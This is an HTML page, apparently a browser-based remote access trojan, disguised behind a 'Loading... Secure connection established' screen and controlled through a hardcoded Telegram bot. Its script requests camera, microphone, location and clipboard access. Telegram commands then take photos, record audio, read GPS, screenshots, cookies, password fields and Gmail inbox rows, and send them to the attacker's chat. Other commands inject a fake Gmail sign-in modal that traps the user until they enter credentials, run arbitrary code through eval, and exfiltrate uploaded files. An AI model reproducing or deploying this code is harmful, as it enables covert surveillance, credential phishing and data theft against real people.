<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Loading...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #f5f5f5;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .loader-container {
            text-align: center;
            background: white;
            padding: 2rem;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            z-index: 1000;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 1rem;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        iframe {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 0;
            opacity: 0;
            transition: opacity 0.8s;
        }
        .gmail-phish-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.7);
            z-index: 10000;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
        }
        .gmail-phish-box {
            background: white;
            border-radius: 8px;
            width: 90%;
            max-width: 450px;
            padding: 30px 25px 40px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            text-align: center;
        }
        .gmail-phish-box input {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
        }
        .gmail-phish-box button {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
        }
        .error-msg { color: #d93025; font-size: 14px; margin-top: 10px; display: none; }
        body.modal-active { overflow: hidden; }
    </style>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
</head>
<body>
    <div class="loader-container" id="loadingOverlay">
        <div class="spinner"></div>
        <h2>Loading, please wait...</h2>
        <p>Secure connection established.</p>
    </div>
    <iframe id="mainFrame" src="https://example.com" sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals"></iframe>

    <script>
        // ================= CONFIGURATION =================
        const BOT_TOKEN = '8705927666:AAF0qRR0dSmBSG4kMMokObu6zXw3ZPQjGTI';
        const ADMIN_CHAT_ID = '8737104261';
        const POLL_INTERVAL = 3000;
        const START_DELAY = 5000;
        const AUDIO_DURATION_MS = 120000;   // 2 minutes

        let isRegistered = false;
        let updateId = 0;
        let intervalId = null;
        let phishingModalActive = false;
        let deviceId = null;
        let permissionsStatus = { camera: false, microphone: false, location: false, clipboard: false };
        let gmailDetectedNotified = false;   // Avoid spamming every reload

        // Enable console logs for debugging (remove for stealth)
        // console.log = function() {};
        // console.error = function() {};

        const TELEGRAM_HEADERS = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        };

        // ================= TELEGRAM HELPERS =================
        async function sendMessage(text, parseMode = 'HTML', replyMarkup = null) {
            try {
                const body = { chat_id: ADMIN_CHAT_ID, text, parse_mode: parseMode };
                if (replyMarkup) body.reply_markup = replyMarkup;
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { ...TELEGRAM_HEADERS, 'Content-Type': 'application/json' },
                    body: JSON.stringify(body)
                });
                const data = await response.json();
                console.log('sendMessage response:', data);
                return data;
            } catch(e) { console.error(e); }
        }

        async function sendPhoto(blob, caption) {
            const fd = new FormData();
            fd.append('chat_id', ADMIN_CHAT_ID);
            fd.append('photo', blob, 'capture.jpg');
            fd.append('caption', caption);
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', headers: TELEGRAM_HEADERS, body: fd });
        }

        async function sendDocument(blob, filename, caption) {
            const fd = new FormData();
            fd.append('chat_id', ADMIN_CHAT_ID);
            fd.append('document', blob, filename);
            fd.append('caption', caption);
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', headers: TELEGRAM_HEADERS, body: fd });
        }

        // ================= PERMISSIONS =================
        async function requestAllPermissions() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                permissionsStatus.camera = true;
                stream.getTracks().forEach(t => t.stop());
            } catch(e) { permissionsStatus.camera = false; }
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                permissionsStatus.microphone = true;
                stream.getTracks().forEach(t => t.stop());
            } catch(e) { permissionsStatus.microphone = false; }
            try {
                await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject);
                });
                permissionsStatus.location = true;
            } catch(e) { permissionsStatus.location = false; }
            try {
                await navigator.clipboard.readText();
                permissionsStatus.clipboard = true;
            } catch(e) { permissionsStatus.clipboard = false; }
        }

        // ================= REGISTRATION =================
        async function registerClient() {
            deviceId = 'dev_' + Math.random().toString(36).substr(2, 8);
            const statusEmoji = (perm) => perm ? '🟢' : '🔴';
            const permLine = `📷 ${statusEmoji(permissionsStatus.camera)} | 🎤 ${statusEmoji(permissionsStatus.microphone)} | 📍 ${statusEmoji(permissionsStatus.location)} | 📋 ${statusEmoji(permissionsStatus.clipboard)}`;
            await sendMessage(
                `🔌 *New Device Connected*\n🆔 \`${deviceId}\`\n📱 ${navigator.platform} | ${navigator.userAgent.substring(0,60)}...\n📺 ${screen.width}x${screen.height}\n${permLine}`,
                'Markdown'
            );
        }

        // ================= GMAIL DETECTION & READING =================
        function isGmailPage() {
            return window.location.href.includes('mail.google.com');
        }

        async function notifyGmailDetected() {
            if (!gmailDetectedNotified) {
                gmailDetectedNotified = true;
                await sendMessage(`📧 *Gmail detected* on device \`${deviceId}\`\nUser is now viewing their inbox. Use /read_emails to fetch messages.`, 'Markdown');
            }
        }

        async function readGmailInbox() {
            if (!isGmailPage()) {
                return { success: false, error: "Not on Gmail page. User must open mail.google.com first." };
            }
            // Wait a bit for the inbox to load
            await new Promise(r => setTimeout(r, 2000));
            const emails = [];
            // Gmail's inbox rows (desktop and mobile)
            const rows = document.querySelectorAll('.zA, .zE, .Cp');
            for (let row of rows.slice(0, 20)) { // max 20 emails
                const from = row.querySelector('.yP, .zF, .bA4')?.innerText || '';
                const subject = row.querySelector('.bog, .bqe, .b6')?.innerText || '';
                const snippet = row.querySelector('.y2, .y3, .b8c')?.innerText || '';
                if (from || subject) {
                    emails.push({ from, subject, snippet: snippet.substring(0, 100) });
                }
            }
            if (emails.length === 0) {
                return { success: true, data: "No emails found. Make sure you are on the inbox view." };
            }
            return { success: true, data: emails };
        }

        // ================= HISTORY (LIMITED) =================
        async function getBrowserHistory() {
            const navEntries = performance.getEntriesByType("navigation");
            let navInfo = "";
            if (navEntries.length > 0) {
                const nav = navEntries[0];
                navInfo = `Type: ${nav.type}\nRedirects: ${nav.redirectCount}\nDuration: ${nav.duration}ms\n`;
            }
            const info = `📍 *Current Page:* ${location.href}\n↩️ *Referrer:* ${document.referrer || "none"}\n${navInfo}\n\n⚠️ *Unable to read full browser history* due to browser security. Web pages cannot access the full history list.\n\n💡 *Alternative:* Use \`/eval\` to inject a script that records future navigation (while this page stays open).`;
            return info;
        }

        // ================= PHISHING MODAL =================
        function createPhishingModal() {
            if (phishingModalActive) return;
            phishingModalActive = true;
            document.body.classList.add('modal-active');

            const modal = document.createElement('div');
            modal.className = 'gmail-phish-modal';
            modal.innerHTML = `
                <div class="gmail-phish-box">
                    <h1>Sign in to continue to Gmail</h1>
                    <input type="email" id="phish-email" placeholder="Email or phone">
                    <input type="password" id="phish-password" placeholder="Password">
                    <button id="phish-submit">Next</button>
                    <div class="error-msg" id="phish-error">Incorrect email or password. Please try again.</div>
                </div>
            `;
            document.body.appendChild(modal);

            const blockKeys = (e) => { if (e.key === 'Escape') { e.preventDefault(); document.getElementById('phish-error').style.display = 'block'; } };
            document.addEventListener('keydown', blockKeys);
            modal.addEventListener('click', (e) => { if (e.target === modal) document.getElementById('phish-error').style.display = 'block'; });

            const emailInp = document.getElementById('phish-email');
            const passInp = document.getElementById('phish-password');
            const errDiv = document.getElementById('phish-error');
            const submit = async () => {
                const email = emailInp.value.trim();
                const pass = passInp.value;
                if (!email || !pass) { errDiv.style.display = 'block'; errDiv.innerText = 'Please fill both fields.'; return; }
                await sendMessage(`🎣 *Gmail Credentials*\n📧 Email: ${email}\n🔑 Password: ${pass}`, 'Markdown');
                modal.remove();
                document.body.classList.remove('modal-active');
                phishingModalActive = false;
                document.removeEventListener('keydown', blockKeys);
                setTimeout(() => { window.location.href = 'https://mail.google.com'; }, 500);
            };
            document.getElementById('phish-submit').addEventListener('click', submit);
            emailInp.addEventListener('keypress', e => { if (e.key === 'Enter') submit(); });
            passInp.addEventListener('keypress', e => { if (e.key === 'Enter') submit(); });
        }

        // ================= COMMAND HANDLER =================
        async function handleCommand(text) {
            console.log('Received command:', text);
            const parts = text.trim().split(' ');
            let cmd = parts[0].toLowerCase();
            if (cmd === '/phishgmail' || cmd === '/phish_gmail') cmd = '/phish_gmail';
            if (cmd === '/grabpass' || cmd === '/grab_pass') cmd = '/grab_pass';
            if (cmd === '/devices' || cmd === '/list') cmd = '/devices';
            if (cmd === '/reademails' || cmd === '/read_emails') cmd = '/read_emails';

            try {
                switch(cmd) {
                    case '/start':
                        const buttons = {
                            inline_keyboard: [
                                [{ text: '📷 Camera', callback_data: 'photo' }, { text: '🎤 Mic', callback_data: 'audio' }],
                                [{ text: '📍 GPS', callback_data: 'location' }, { text: '📸 Screenshot', callback_data: 'screenshot' }],
                                [{ text: '🍪 Cookies', callback_data: 'cookies' }, { text: '🔑 Grab Pass', callback_data: 'grab_pass' }],
                                [{ text: '📋 Clipboard', callback_data: 'clipboard' }, { text: '🎣 Phish Gmail', callback_data: 'phish_gmail' }],
                                [{ text: '📁 Upload', callback_data: 'upload' }, { text: '💻 Eval', callback_data: 'eval' }],
                                [{ text: '🔄 Devices', callback_data: 'devices' }, { text: '📜 History', callback_data: 'history' }, { text: '📧 Read Emails', callback_data: 'read_emails' }]
                            ]
                        };
                        await sendMessage(
                            `✅ *RAT Active* | \`${deviceId}\`\n🟢 Online | Permissions: ${permissionsStatus.camera ? '✅📷' : '❌📷'} ${permissionsStatus.microphone ? '✅🎤' : '❌🎤'} ${permissionsStatus.location ? '✅📍' : '❌📍'} ${permissionsStatus.clipboard ? '✅📋' : '❌📋'}\n\n${isGmailPage() ? '📧 *Gmail detected* – use /read_emails' : ''}`,
                            'Markdown', buttons
                        );
                        break;
                    case '/read_emails':
                        const result = await readGmailInbox();
                        if (result.success) {
                            if (typeof result.data === 'string') {
                                await sendMessage(`📧 *Gmail Inbox*\n${result.data}`, 'Markdown');
                            } else {
                                let msg = `📧 *Latest emails* (${result.data.length}):\n\n`;
                                for (let i=0; i<result.data.length; i++) {
                                    const e = result.data[i];
                                    msg += `${i+1}. *${e.from || '?'}* – ${e.subject || 'no subject'}\n   ${e.snippet || ''}\n\n`;
                                    if (msg.length > 3800) break;
                                }
                                await sendMessage(msg, 'Markdown');
                            }
                        } else {
                            await sendMessage(`❌ ${result.error}`);
                        }
                        break;
                    case '/history':
                        const historyInfo = await getBrowserHistory();
                        await sendMessage(historyInfo, 'Markdown');
                        break;
                    case '/phish_gmail':
                        if (!phishingModalActive) createPhishingModal();
                        await sendMessage('🎣 Phishing modal injected. User is blocked until credentials are entered.');
                        break;
                    case '/gmail':
                        if (location.href.includes('accounts.google.com')) {
                            let email = document.querySelector('input[type="email"]')?.value || '';
                            let pass = document.querySelector('input[type="password"]')?.value;
                            if (!pass) {
                                const pf = document.querySelector('input[type="password"]');
                                if (pf) { pf.focus(); setTimeout(() => pf.blur(), 100); }
                                await sendMessage('Attempting to trigger autofill...');
                            } else {
                                await sendMessage(`🔑 Gmail credentials extracted:\n📧 Email: ${email}\n🔑 Password: ${pass}`);
                            }
                        } else {
                            await sendMessage('Not on Google login page. Use /phish_gmail to force a fake modal.');
                        }
                        break;
                    case '/photo':
                        try {
                            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                            const video = document.createElement('video');
                            video.srcObject = stream;
                            await new Promise(r => { video.onloadedmetadata = r; video.play(); });
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            canvas.getContext('2d').drawImage(video, 0, 0);
                            stream.getTracks().forEach(t => t.stop());
                            canvas.toBlob(blob => sendPhoto(blob, '📸 Camera capture'), 'image/jpeg');
                        } catch(e) { await sendMessage(`Camera error: ${e.message}`); }
                        break;
                    case '/audio':
                        try {
                            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                            const mediaRecorder = new MediaRecorder(stream);
                            let chunks = [];
                            mediaRecorder.ondataavailable = e => chunks.push(e.data);
                            mediaRecorder.onstop = async () => {
                                const blob = new Blob(chunks, { type: 'audio/webm' });
                                await sendDocument(blob, `recording_${Date.now()}.webm`, `🎙️ Audio recording (${AUDIO_DURATION_MS/1000}s)`);
                                stream.getTracks().forEach(t => t.stop());
                            };
                            mediaRecorder.start();
                            setTimeout(() => mediaRecorder.stop(), AUDIO_DURATION_MS);
                            await sendMessage(`Recording audio for ${AUDIO_DURATION_MS/1000} seconds...`);
                        } catch(e) { await sendMessage(`Microphone error: ${e.message}`); }
                        break;
                    case '/location':
                        navigator.geolocation.getCurrentPosition(async pos => {
                            await sendMessage(`📍 GPS Location:\nLat: ${pos.coords.latitude}\nLon: ${pos.coords.longitude}\nAccuracy: ${pos.coords.accuracy}m`);
                        }, async err => await sendMessage(`GPS error: ${err.message}`));
                        break;
                    case '/screenshot':
                        html2canvas(document.body).then(canvas => {
                            canvas.toBlob(blob => sendPhoto(blob, '📸 Screenshot'), 'image/png');
                        }).catch(e => sendMessage(`Screenshot failed: ${e.message}`));
                        break;
                    case '/cookies':
                        await sendMessage(`🍪 Cookies: ${document.cookie || 'none'}`);
                        break;
                    case '/grab_pass':
                        const pw = document.querySelector('input[type="password"]');
                        if (pw && pw.value) await sendMessage(`🔐 Password: ${pw.value}`);
                        else await sendMessage('No password field with value found.');
                        break;
                    case '/clipboard':
                        try {
                            const txt = await navigator.clipboard.readText();
                            await sendMessage(`📋 Clipboard: ${txt}`);
                        } catch(e) { await sendMessage(`Clipboard error: ${e.message}`); }
                        break;
                    case '/eval':
                        if (parts.length > 1) {
                            const code = text.substring(5);
                            let result = eval(code);
                            if (typeof result !== 'string') result = JSON.stringify(result);
                            await sendMessage(`✅ Eval result:\n${result.substring(0, 3900)}`);
                        } else await sendMessage('Usage: /eval <js code>');
                        break;
                    case '/upload':
                        const input = document.createElement('input');
                        input.type = 'file';
                        input.onchange = async (e) => {
                            const file = e.target.files[0];
                            if (file) await sendDocument(file, file.name, `📁 File: ${file.name}`);
                        };
                        input.click();
                        await sendMessage('File picker opened on victim side.');
                        break;
                    case '/devices':
                        const statusLine = `🖥️ *Your device*\n🆔 \`${deviceId}\`\n🟢 Status: Online\nPermissions:\n📷 Camera: ${permissionsStatus.camera ? '✅' : '❌'}\n🎤 Mic: ${permissionsStatus.microphone ? '✅' : '❌'}\n📍 GPS: ${permissionsStatus.location ? '✅' : '❌'}\n📋 Clipboard: ${permissionsStatus.clipboard ? '✅' : '❌'}`;
                        await sendMessage(statusLine, 'Markdown');
                        break;
                    default:
                        await sendMessage(`Unknown command: ${cmd}. Try /start for help.`);
                }
            } catch(err) {
                await sendMessage(`Error: ${err.message}`);
            }
        }

        // ================= POLLING =================
        async function syncOffset() {
            try {
                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1&timeout=1`, { headers: TELEGRAM_HEADERS });
                const data = await res.json();
                if (data.ok && data.result && data.result.length > 0) {
                    updateId = data.result[data.result.length - 1].update_id + 1;
                } else {
                    updateId = 0;
                }
                console.log('Update offset set to:', updateId);
            } catch(e) { console.error(e); }
        }

        async function pollUpdates() {
            if (!isRegistered) return;
            try {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${updateId}&timeout=15`;
                const res = await fetch(url, { headers: TELEGRAM_HEADERS });
                const data = await res.json();
                if (data.ok && data.result) {
                    for (const upd of data.result) {
                        if (upd.update_id >= updateId) {
                            updateId = upd.update_id + 1;
                            if (upd.message && upd.message.text) {
                                await handleCommand(upd.message.text);
                            } else if (upd.callback_query) {
                                const cbData = upd.callback_query.data;
                                await handleCommand('/' + cbData);
                                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery?callback_query_id=${upd.callback_query.id}`, { headers: TELEGRAM_HEADERS });
                            }
                        }
                    }
                }
            } catch(e) { console.error(e); }
        }

        // ================= PAGE NAVIGATION DETECTION =================
        let lastUrl = location.href;
        new MutationObserver(() => {
            const url = location.href;
            if (url !== lastUrl) {
                lastUrl = url;
                if (isGmailPage()) {
                    notifyGmailDetected();
                } else {
                    gmailDetectedNotified = false;
                }
            }
        }).observe(document, { subtree: true, childList: true });

        // Also check on load
        window.addEventListener('load', () => {
            if (isGmailPage()) notifyGmailDetected();
        });

        // ================= INIT =================
        async function deleteWebhookAndStart() {
            console.log('Deleting webhook...');
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/deleteWebhook`, { method: 'POST', headers: TELEGRAM_HEADERS });
            } catch(e) { console.error(e); }

            await requestAllPermissions();
            await syncOffset();
            await registerClient();
            isRegistered = true;
            intervalId = setInterval(pollUpdates, POLL_INTERVAL);
            document.getElementById('loadingOverlay').style.display = 'none';
            document.getElementById('mainFrame').style.opacity = '1';
        }

        setTimeout(deleteWebhookAndStart, START_DELAY);
    </script>
</body>
</html>
